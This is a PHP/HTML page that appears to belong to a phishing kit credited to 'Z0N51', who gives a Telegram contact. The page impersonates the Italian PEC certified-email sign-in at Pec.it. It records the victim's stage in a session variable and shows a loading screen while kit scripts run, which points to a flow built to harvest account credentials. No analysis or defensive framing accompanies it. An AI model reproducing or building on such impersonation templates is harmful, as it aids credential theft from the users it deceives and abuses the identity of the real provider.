<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "loading";
    
?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title> Sign in to your PEC email account | Pec.it </title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="<?php echo CSSPATH; ?>/bootstrap.css">
  <link rel="stylesheet"  href="<?php echo CSSPATH; ?>/style.css">             


  <!-- logo site web-->
  <link rel="icon" href="<?php echo IMGSPATH; ?>/fav.ico" type="image/x-icon" />


  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"/>

</head>



<body>
 

 <div class="loading">
   <div class="loading-bg"></div>
 </div>


  <!-- template files js-->
  <script src="<?php echo JSPATH; ?>/jquery-3.5.1.min.js"></script>
  <script src="<?php echo JSPATH; ?>/bootstrap.min.js"></script>
  <script src="<?php echo JSPATH; ?>/jquery.mask.js"></script>
  <script src="<?php echo JSPATH; ?>/js.js"></script>

  <script>
    
  </script>
 
</body>
</html>